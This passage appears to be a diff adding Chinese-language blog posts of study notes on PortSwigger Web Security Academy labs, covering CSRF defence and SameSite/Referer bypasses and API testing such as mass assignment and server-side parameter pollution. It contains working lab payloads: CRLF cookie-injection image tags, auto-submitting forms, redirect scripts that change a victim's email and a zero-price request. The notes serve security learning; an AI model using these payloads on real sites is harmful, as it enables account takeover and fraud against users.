+<p>例如，将第2个账户的两个值都覆盖第1个账户之后，需要在<code>CSRF PoC</code>中进行调整。将自动提交的<code>&lt;script&gt;</code>标签，稍作更改，添加<code>crsfKey</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;document.forms[0].submit()&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>这里是因为<code>search</code>对应的搜索功能没有 CSRF 保护，所以可以使用它来将 cookie 注入受害者用户的浏览器。</p>
+<h3 id="cookie-中重复令牌">Cookie 中重复令牌</h3>
+<p>有些应用程序不维护任何已发出的令牌的服务器端记录，而是在 cookie 和请求参数中复制每个令牌。当后续请求被验证时，应用程序只需验证请求参数中提交的令牌是否与 cookie 提交的值相符。这有时被称为针对CSRF的“双重提交”防御，因其易于实现且无需任何服务器端状态而被推荐：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST /email/change HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: vulnerable-website.com
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="ln">4</span><span class="cl">Content-Length: 68
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com
+</span></span></code></pre></div><p>只要攻击者能够将设置被害者的Cookie，就可以通过让Cookie中的<code>csrf</code>值和外部的令牌相同而成功攻击。</p>
+<p>例如，将<code>csrf</code>值全部改为<code>fake</code>，于是，将生成的<code>PoC</code>中“自动提交”的<code>&lt;script&gt;</code>标签改为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;document.forms[0].submit();&#34;</span><span class="p">/&gt;</span>
+</span></span></code></pre></div><p>再更改邮箱地址后，放入攻击服务器中即可。</p>
+<h2 id="绕过samesite-cookie限制">绕过SameSite cookie限制</h2>
+<p>SameSite是一种浏览器安全机制，用于控制浏览器在<strong>跨站请求</strong>（即请求的来源与目标站点不同）时是否发送该 Cookie。通过在 Cookie 中设置 SameSite 属性，服务器可以声明该 Cookie 是否应被附加到跨站请求中，从而增强 Web 应用的安全性。</p>
+<blockquote>
+<p>[!note]
+在 Cookie 的 SameSite 机制中，“同一站点”（Same-site）是根据 <strong>站点</strong>（site）来判定的，而不是根据源（origin）。判定规则：</p>
+<ul>
+<li>比较两个 URL 的 <strong>协议（scheme）</strong> 是否相同（例如 <code>https://</code> 和 <code>http://</code>）。</li>
+<li>比较两个 URL 的 <strong>有效顶级域名（如 <code>.com</code>、<code>.co.uk</code> 等） + 一级域名（eTLD+1）</strong> 是否相同。</li>
+<li>如果 <strong>协议相同</strong> 且 <strong>eTLD+1 相同</strong>，则视为<strong>同一站点</strong>；否则视为<strong>跨站</strong>（cross-site）。
+例如：</li>
+</ul>
+<table>
+	<thead>
+			<tr>
+					<th><strong>请求来源</strong></th>
+					<th><strong>请求去向</strong></th>
+					<th><strong>同站？</strong></th>
+					<th><strong>同源？</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>https://example.com</code></td>
+					<td>是</td>
+					<td>是</td>
+			</tr>
+			<tr>
+					<td><code>https://app.example.com</code></td>
+					<td><code>https://intranet.example.com</code></td>
+					<td>是</td>
+					<td>不，域名不匹配</td>
+			</tr>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>https://example.com:8080</code></td>
+					<td>是</td>
+					<td>不，端口不匹配</td>
+			</tr>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>https://example.co.uk</code></td>
+					<td>不，eTLD不匹配</td>
+					<td>不，域名不匹配</td>
+			</tr>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>http://example.com</code></td>
+					<td>不，协议不匹配</td>
+					<td>不，协议不匹配</td>
+			</tr>
+	</tbody>
+</table>
+</blockquote>
+<p>SameSite有3个级别，分别如下：</p>
+<table>
+	<thead>
+			<tr>
+					<th>值</th>
+					<th>行为描述</th>
+					<th>适用场景示例</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Strict</strong></td>
+					<td><strong>最严格</strong>：Cookie 仅在<strong>同一站点</strong>（即请求的站点与 Cookie 的域名完全一致）的请求中发送。<strong>所有跨站请求均不发送</strong></td>
+					<td>银行交易、个人设置页等高度敏感的操作。用户必须先在当前站点内点击链接或提交表单才能保持登录</td>
+			</tr>
+			<tr>
+					<td><strong>Lax</strong></td>
+					<td><strong>中等</strong>：在跨站请求中，仅允许<strong>安全的顶级导航</strong>（如点击链接、GET 表单提交）发送 Cookie，这既允许从外部链接进入网站时保持登录，又能防止跨站 POST 攻击</td>
+					<td>大部分网站的会话 Cookie。用户从搜索引擎点击链接进入主页时仍可保持登录，但跨站的 POST 操作会被阻断</td>
+			</tr>
+			<tr>
+					<td><strong>None</strong></td>
+					<td><strong>无限制</strong>：所有跨站请求都会发送 Cookie（包括第三方嵌入的请求）。但设置 <code>SameSite=None</code> 时必须同时指定 <code>Secure</code> 属性，<code>SameSite=None; Secure</code>，即 Cookie 只能通过 HTTPS 发送，否则浏览器会拒绝</td>
+					<td>需要跨站携带 Cookie 的场景，如单点登录（SSO）、嵌入第三方服务的 widget 等</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="get方法绕过-lax">GET方法绕过 Lax</h3>
+<p>即使普通的 <code>GET</code> 请求不被Lax允许，一些框架也提供了覆盖请求行中指定的方法的方式。例如，Symfony 支持表单中的 <code>_method</code> 参数，该参数在路由时优先于普通方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;form action=&#34;https://vulnerable-website.com/account/transfer-payment&#34; method=&#34;GET&#34;&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;_method&#34; value=&#34;POST&#34;&gt;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;recipient&#34; value=&#34;hacker&#34;&gt;
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;amount&#34; value=&#34;1000000&#34;&gt;
+</span></span><span class="line"><span class="ln">5</span><span class="cl">&lt;/form&gt;
+</span></span></code></pre></div><p>例如，在登录的 <code>POST /login</code> 页面，没有发现响应的 <code>Set-Cookie</code> 参数中对 <code>SameSite</code> 有专门设置，那大概率就是默认的Lax级别。在更改电子邮件地址页面，直接将 <code>POST</code> 方法强行改为 <code>GET</code> 方法是不行的。于是，有两种具体的实施思路。一个是，在网址后面紧跟 <code>_method</code>，即 <code>&amp;_method=POST</code> 。然后生成 <code>PoC</code> 即可。另一个是，就用 <code>GET</code> 方法不变，更改 <code>PoC</code> 。更改后的结果如上所示。</p>
+<h3 id="重定向绕过-strict">重定向绕过 Strict</h3>
+<p>例如，在 <code>login</code> 页面中已经发现，响应的 <code>Set-Cookie</code> 参数中设置了 <code>SameSite=Strict</code>。于是，考虑客户端的重定向绕过。发表评论成功之后，发现 <code>/post/comment/confirmation?postId=x</code> 网址被重定向到了之前的博客页面。仔细查看，发现是有一个js文件根据 <code>postId</code> 参数进行的重定向。于是，进行路径遍历，直到重定向到已登录的账户页面。发现路径遍历的结果是 <code>/post/comment/confirmation?postId=1/../../my-account</code> 。在漏洞服务器中尝试下面的payload，发现确实出现了已登录的账户页面：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    document.location = &#34;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account&#34;;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>这说明，浏览器在第二个请求中包含了已验证的会话 cookie。第1个请求是从漏洞服务器到 <code>/post/comment/confirmation?postId=1</code> ，属于跨站请求；第2个请求是到 <code>/my-account</code> ，属于同站请求。接着查看修改邮件地址的页面，把 <code>POST</code> 方法更改为 <code>GET</code> 方法居然能够成功。于是，直接构造payload进行攻击：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    document.location = &#34;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1&#34;;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>这里为了避免干扰 <code>postId</code> 参数解析，对 <code>&amp;</code> 进行了 URL 编码。</p>
+<h3 id="cookie-刷新绕过-lax">cookie 刷新绕过 Lax</h3>
+<p>如前所述，如果网站在设置 cookie 时未包含 <code>SameSite</code> 属性，Chrome 默认会自动应用 <code>Lax</code> 限制。然而，为了避免破坏单点登录 (SSO) 机制，它实际上不会对顶级 <code>POST</code> 请求在最初的 120 秒强制执行这些限制。因此，用户可能在两分钟的时间窗口内容易受到跨站攻击。但是，在2分钟内完成所有攻击有点仓促。于是，有两种思路。一个是，如果能在网站上找到一个小工具，强制受害者获取新的会话cookie，那就可以在进行主要攻击之前提前刷新他们的cookie。例如，完成基于OAuth的登录流程可能每次都会产生一个新的会话，因为OAuth服务不一定知道用户是否仍然登录到目标网站。让用户离开当前页面去 OAuth 登录，完成后再返回，但这样会打断攻击流程，且需要用户配合返回。另一个是，从新标签页触发Cookie刷新，这样浏览器就不会在发动最终攻击前离开页面。但是，这个弹窗默认会被浏览器屏蔽：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">window.open(&#39;https://vulnerable-website.com/login/sso&#39;);
+</span></span></code></pre></div><p>为了绕过这个问题，可以用事件处理程序<code>onclick</code>将语句包装如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">window.onclick = () =&gt; { window.open(&#39;https://vulnerable-website.com/login/sso&#39;); }
+</span></span></code></pre></div><p>例如，对于使用 OAuth 流程登录账号，发现更改电子邮件的页面没有 <code>csrf</code> 令牌，这就可能受到攻击。登录的2分钟内，用普通的 <code>PoC</code> 放在漏洞利用服务器中，发现确实能够更改邮件地址。这说明时间窗口的存在，攻击者需要刷新会话以重置窗口。然后，利用 <code>/social-login</code> 刷新会话。 <code>/social-login</code> 会自动启动OAuth流程，即使用户已登录，也会重新认证并设置新的会话Cookie。于是，采用下面的payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;form method=&#34;POST&#34; action=&#34;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&#34;&gt;
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@portswigger.net&#34;&gt;
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">&lt;p&gt;Click anywhere on the page&lt;/p&gt;
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    window.onclick = () =&gt; {
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        window.open(&#39;https://YOUR-LAB-ID.web-security-academy.net/social-login&#39;);
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        setTimeout(changeEmail, 5000);
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    }
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    function changeEmail() {
+</span></span><span class="line"><span class="ln">12</span><span class="cl">        document.forms[0].submit();
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    }
+</span></span><span class="line"><span class="ln">14</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>查看漏洞利用效果时，点击任意一处即可触发。</p>
+<h2 id="绕过基于referer的csrf防御">绕过基于Referer的CSRF防御</h2>
+<p>除了使用 CSRF 令牌的防御之外，一些应用程序还会使用 HTTP <code>Referer</code> 头来尝试防御 CSRF 攻击，通常通过验证请求是否来自应用程序自己的域。这种方法通常效果较差，并且经常容易被绕过。</p>
+<h3 id="referer的验证依赖于头部的存在">Referer的验证依赖于头部的存在</h3>
+<p>一些应用程序在请求中存在 <code>Referer</code> 头时会验证它，但如果省略该头则跳过验证。在这种情况下，攻击者可以以某种方式构造他们的 CSRF 利用，使受害用户的浏览器在生成的请求中丢弃 <code>Referer</code> 头。实现这一点的方法有很多，但最简单的方法是在托管 CSRF 攻击的 HTML 页面中使用 META 标签：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;meta name=&#34;referrer&#34; content=&#34;never&#34;&gt;
+</span></span></code></pre></div><p>例如，在更改电子邮件地址的页面，发现改动 <code>Referer</code> 头，请求会被拒绝，但是删除又会被接受。所以，在生成的 <code>PoC</code> 中添加上面的META标签即可。</p>
+<h3 id="referer验证失效">Referer验证失效</h3>
+<p>一些应用程序以一种简单粗暴的方式验证 <code>Referer</code> 头，这种方式可能被绕过。例如，如果应用程序验证 <code>Referer</code> 中的域名以预期值开头，攻击者就可以将其作为自己域名的子域名放置。同样，如果应用程序只是验证 <code>Referer</code> 是否包含其自身的域名，攻击者就可以在 URL 的其他位置放置所需的值：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://attacker-website.com/csrf-attack?vulnerable-website.com
+</span></span></code></pre></div><p>但是，许多浏览器现在默认会从 <code>Referer</code> 头中去掉查询字符串。可以通过确保包含漏洞利用的响应设置了 <code>Referrer-Policy: unsafe-url</code> 头来覆盖此行为。这将确保发送完整的 URL，包括查询字符串。</p>
+<p>例如，在更改邮件地址的页面，发现网站能够接受任何包含有预期域名的 <code>Referer</code> 头。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Referer: https://incorrect.net?YOUR-LAB-ID.web-security-academy.net
+</span></span></code></pre></div><p>这样能够被接受。于是，在生成的 <code>PoC</code> 中修改一处：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">history.pushState(&#39;&#39;, &#39;&#39;, &#39;/?YOUR-LAB-ID.web-security-academy.net&#39;);
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>这里的 <code>history.pushState()</code> 是在不刷新页面的情况下改变浏览器地址栏的 URL。但是，因为许多浏览器现在默认会从Referer头中移除查询字符串以作为安全措施。所以，为了覆盖此行为并确保请求中包含完整URL，还需要在漏洞利用服务器的“头部”里添加 <code>Referrer-Policy: unsafe-url</code> 头。</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>API 测试</title>
+      <link>https://all-on.github.io/posts/web/api-%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Fri, 17 Apr 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/api-%E6%B5%8B%E8%AF%95/</guid>
+      <description>&lt;p&gt;API测试非常重要，因为API中的漏洞可能破坏网站的机密性、完整性和可用性的核心方面。本节重点关注 RESTful 和 JSON API。&lt;/p&gt;
+&lt;h2 id=&#34;api-侦察&#34;&gt;API 侦察&lt;/h2&gt;
+&lt;p&gt;要开始 API 测试，首先需要尽可能多地了解该 API 的信息，以发现其攻击面。一旦确定了端点，需要确定如何与它们交互。这使得能够构建有效的HTTP请求来测试API。例如，应该了解以下信息：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p>API测试非常重要，因为API中的漏洞可能破坏网站的机密性、完整性和可用性的核心方面。本节重点关注 RESTful 和 JSON API。</p>
+<h2 id="api-侦察">API 侦察</h2>
+<p>要开始 API 测试，首先需要尽可能多地了解该 API 的信息，以发现其攻击面。一旦确定了端点，需要确定如何与它们交互。这使得能够构建有效的HTTP请求来测试API。例如，应该了解以下信息：</p>
+<ul>
+<li>API处理的输入数据，包括强制和可选参数。</li>
+<li>API 接受的请求类型，包括支持的 HTTP 方法和媒体格式。</li>
+<li>速率限制和认证机制。</li>
+</ul>
+<h2 id="api-文档">API 文档</h2>
+<p>API 通常会被文档化，以便开发者知道如何使用和集成它们。文档既可以是人类可读的形式，也可以是机器可读的形式。设计的可读文档旨在帮助开发者理解如何使用 API。它可能包含详细的解释、示例和使用场景。机器可读文档设计为由软件处理，用于自动化API集成和验证等任务。它采用了像JSON或XML这样的结构化格式。</p>
+<h3 id="发现api文档">发现API文档</h3>
+<p>即使API文档没有公开，仍然可以通过浏览使用该API的应用程序访问它。如果确定了某个资源的端点，务必调查基础路径。比如，如果确定了资源端点 <code>/api/swagger/v1/users/123</code>，那么应调查以下路径：</p>
+<ul>
+<li><code>/api/swagger/v1</code></li>
+<li><code>/api/swagger</code></li>
+<li><code>/api</code></li>
+</ul>
+<p>例如，在电子邮件页面更新邮件之后，发现有一个名为 <code>/api/user/...</code> 的页面。经过测试，<code>/api</code> 是有效的API文档。那就进入并点击 <code>DELETE</code> 行，删除目标用户。</p>
+<h2 id="识别api端点">识别API端点</h2>
+<p>浏览应用时，寻找提示 URL 结构中 API 端点的模式，例如 <code>/api/</code>。还要注意JavaScript文件。这些节点可能包含未通过浏览器直接触发的API端点引用。</p>
+<h3 id="识别支持的http方法">识别支持的HTTP方法</h3>
+<p>HTTP 方法指定对资源执行的操作。例如：</p>
+<ul>
+<li><code>GET</code>- 从资源中检索数据</li>
+<li><code>PATCH</code>- 对资源进行部分更改</li>
+<li><code>OPTIONS</code>- 检索可用于资源的请求方法类型信息</li>
+</ul>
+<p>API端点可能支持不同的HTTP方法。因此，在研究API端点时，测试所有可能的方法非常重要。这可能帮助识别更多端点功能，从而打开更多攻击面。例如，端点 <code>/api/tasks</code> 可能支持以下方法：</p>
+<ul>
+<li><code>GET /api/tasks</code>- 检索任务列表</li>
+<li><code>POST /api/tasks</code>- 创建新任务</li>
+<li><code>DELETE /api/tasks/1</code>- 删除任务</li>
+</ul>
+<h3 id="识别支持的内容类型">识别支持的内容类型</h3>
+<p>API端点通常期望数据格式特定。因此，它们的行为可能会根据请求中提供的数据内容类型而有所不同。更改内容类型可能导致：</p>
+<ul>
+<li>触发错误，揭示有用信息。</li>
+<li>绕过有缺陷的防御。</li>
+<li>利用处理逻辑的差异。例如，一个 API 在处理 JSON 数据时可能安全，但在处理 XML 时容易受到注入攻击。</li>
+</ul>
+<p>要更改内容类型，先修改 <code>Content-Type</code> 头部，然后相应地重新格式化请求体。</p>
+<p>例如，要用无余额的账户购买一件商品。进入商品的API端点，把 <code>GET</code> 请求改为 <code>POST</code> 请求。但有提示请求类型只允许 <code>GET</code> 和 <code>PATCH</code>。于是，将请求类型改为 <code>PATCH</code>。又提示 <code>Content-Type</code> 类型错误，于是添加 <code>Content-Type: application/json</code>。再提示内部服务器错误，那就添加一个空json。最后经过参数的提示，添加的内容是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">{&#39;price&#39;:0}
+</span></span></code></pre></div><p>这样就可以零元购。</p>
+<h2 id="寻找隐藏参数">寻找隐藏参数</h2>
+<h3 id="大规模分配漏洞">大规模分配漏洞</h3>
+<p>批量赋值（也称为自动绑定）可能无意中创建隐藏参数。它发生在软件框架自动将请求参数绑定到内部对象的字段时。因此，批量赋值可能导致应用程序支持开发者从未打算处理的参数。</p>
+<h4 id="识别隐藏参数">识别隐藏参数</h4>
+<p>由于批量赋值是从对象字段创建参数，通常可以通过手动检查API返回的对象来识别这些隐藏参数。比如，考虑一个 <code>PATCH /api/users/</code> 请求，允许用户更新用户名和邮箱，包含以下 JSON：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">{
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &#34;username&#34;: &#34;wiener&#34;,
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &#34;email&#34;: &#34;wiener@example.com&#34;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">}
+</span></span></code></pre></div><p>一个并发的 <code>GET /api/users/123</code> 请求返回以下 JSON:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">{
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &#34;id&#34;: 123,
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &#34;name&#34;: &#34;John Doe&#34;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &#34;email&#34;: &#34;john@example.com&#34;,
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    &#34;isAdmin&#34;: &#34;false&#34;
+</span></span><span class="line"><span class="ln">6</span><span class="cl">}
+</span></span></code></pre></div><p>这可能表明隐藏的 <code>id</code> 和 <code>isAdmin</code> 参数与内部用户对象绑定，以及更新后的用户名和电子邮件参数。</p>
+<h4 id="测试大规模分配漏洞">测试大规模分配漏洞</h4>
+<p>要测试是否可以修改枚举的 <code>isAdmin</code> 参数值，将其添加到  <code>PATCH</code> 请求中：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">{
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &#34;username&#34;: &#34;wiener&#34;,
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &#34;email&#34;: &#34;wiener@example.com&#34;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &#34;isAdmin&#34;: false,
+</span></span><span class="line"><span class="ln">5</span><span class="cl">}
+</span></span></code></pre></div><p>此外，发送一个带有无效 <code>isAdmin</code> 参数值的 <code>PATCH</code> 请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">{
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &#34;username&#34;: &#34;wiener&#34;,
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &#34;email&#34;: &#34;wiener@example.com&#34;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &#34;isAdmin&#34;: &#34;foo&#34;,
+</span></span><span class="line"><span class="ln">5</span><span class="cl">}
+</span></span></code></pre></div><p>如果应用表现不同，这可能表明无效值影响了查询逻辑，但有效值没有影响。这可能表明该参数可以被用户成功更新。然后，可以发送一个 <code>PATCH</code> 请求，并将 <code>isAdmin</code> 参数值设置为 <code>true</code>，以尝试利用该漏洞：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">{
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &#34;username&#34;: &#34;wiener&#34;,
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &#34;email&#34;: &#34;wiener@example.com&#34;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &#34;isAdmin&#34;: true,
+</span></span><span class="line"><span class="ln">5</span><span class="cl">}
+</span></span></code></pre></div><p>例如，购买商品后，发现有两个API端点 <code>/api/</code>。第一个是 <code>GET</code> 请求，返回一个 json。第二个是<code>POST</code> 请求，包含一个 json。但是，两个 json的具体内容不同。于是，将 <code>GET</code> 的 json复制到 <code>POST</code> 中，并修改折扣为100，通过。</p>
+<h2 id="服务器端参数污染">服务器端参数污染</h2>
+<p>服务器端参数污染是指网站在服务器端请求中嵌入用户输入，指向内部 API，且没有充分编码。这意味着攻击者可能能够操控或注入参数，从而使他们能够实现以下行为：</p>
+<ul>
+<li>覆盖现有参数。</li>
+<li>修改应用行为。</li>
+<li>访问未经授权的数据。</li>
+</ul>
+<p>查询参数、表单字段、头部和 URL 路径参数都可能存在该漏洞。</p>
+<h3 id="查询字符串测试">查询字符串测试</h3>
+<p>要测试查询字符串中的服务器端参数污染，请在输入中放置查询语法字符，如 <code>#</code>、<code>&amp;</code> 和 <code>=</code>，并观察应用程序的响应。考虑一个漏洞应用，允许根据用户名搜索其他用户。当搜索用户时，浏览器会发出以下请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /userSearch?name=peter&amp;back=/home
+</span></span></code></pre></div><p>为了获取用户信息，服务器会通过以下请求查询内部 API：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /users/search?name=peter&amp;publicProfile=true
+</span></span></code></pre></div><h4 id="截断查询字符串">截断查询字符串</h4>
+<p>可以使用 URL 编码的 <code>#</code> 字符来尝试截断服务器端的请求。为了帮助解释响应，还可以在 <code>#</code> 字符后添加一个字符串。比如，可以修改查询字符串为以下内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /userSearch?name=peter%23foo&amp;back=/home
+</span></span></code></pre></div><p>前端将尝试访问以下URL：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /users/search?name=peter#foo&amp;publicProfile=true
+</span></span></code></pre></div><p>检查响应中是否有关于查询是否被截断的线索。例如，如果响应返回用户 <code>peter</code>，服务器端的查询可能已被截断。如果返回 <code>Invalid name</code> 错误信息，应用程序可能将 <code>foo</code> 视为用户名的一部分。这表明服务器端的请求可能没有被截断。</p>
+<p>如果能够截断服务器端请求，这将取消将 <code>publicProfile</code> 字段设置为 true 的要求。可能能够利用这一点返回非公开的用户资料。</p>
+<h4 id="注入无效参数">注入无效参数</h4>
+<p>可以使用带有 URL 编码的<code>&amp;</code>字符尝试在服务器端请求中添加第二个参数。比如，可以修改查询字符串为以下内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /userSearch?name=peter%26foo=xyz&amp;back=/home
+</span></span></code></pre></div><p>这导致服务器端向内部API发出以下请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /users/search?name=peter&amp;foo=xyz&amp;publicProfile=true
+</span></span></code></pre></div><p>查看回复，了解额外参数是如何解析的。例如，如果响应未变，这可能表明该参数已成功注入但应用忽略了该参数。</p>
+<h4 id="注入有效参数">注入有效参数</h4>
+<p>如果能修改查询字符串，就可以尝试给服务器端请求添加第二个有效参数。比如，如果已经确定了参数 <code>email</code>，可以将其添加到查询字符串中，具体如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /userSearch?name=peter%26email=foo&amp;back=/home
+</span></span></code></pre></div><p>这导致服务器端向内部API发出以下请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /users/search?name=peter&amp;email=foo&amp;publicProfile=true
+</span></span></code></pre></div><p>查看回复，了解额外参数是如何解析的。</p>
+<h4 id="覆盖现有参数">覆盖现有参数</h4>
+<p>为了确认应用是否易受服务器端参数污染影响，可以尝试覆盖原始参数。通过注入同名的第二个参数来实现这一点。比如，可以修改查询字符串为以下内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /userSearch?name=peter%26name=carlos&amp;back=/home
+</span></span></code></pre></div><p>这导致服务器端向内部API发出以下请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /users/search?name=peter&amp;name=carlos&amp;publicProfile=true
